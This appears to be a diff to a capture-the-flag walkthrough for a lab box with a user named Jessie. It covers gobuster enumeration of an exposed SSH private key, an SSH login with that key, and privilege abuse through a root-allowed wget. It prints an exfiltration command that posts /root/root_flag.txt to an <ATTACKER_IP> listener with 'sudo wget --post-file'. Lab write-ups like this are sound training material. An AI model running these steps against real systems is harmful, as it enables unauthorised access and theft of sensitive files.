@@ -14,13 +14,13 @@ Enumerating with gobuster
 reveals sitemap.
 We enumerate again:
 `gobuster dir -u $IP/sitemap -w /usr/share/wordlists/seclists/Discovery/Web-Content/common.txt`
-This time, gobuster found *.ssh*, where is a *id_rsa* private key.
+This time, gobuster found *.ssh*, where is a *id_rsa* private key a public disclosure of private key caused by puttin it under the web root.
 
 We try to connect to ssh as Jessie `chmod 600 id_rsa; ssh -i id_rsa jessie@$IP`, which succeeds.
 Now, we obtain the user flag from `$HOME/Documents/user_flag.txt`.
 ![user flag](./img/user_flag_redacted.png)
 Checking for privileged access
-`sudo -l` reveals that Jessie can use `wget` as root.
+`sudo -l` reveals that Jessie can use `wget` as root which lets us exfiltrate sensitive information.
 ![priv esc](./img/sudo_L.png)
 using this we recover the root flag:
 `sudo /usr/bin/wget --post-file=/root/root_flag.txt <ATTACKER_IP>:1234`
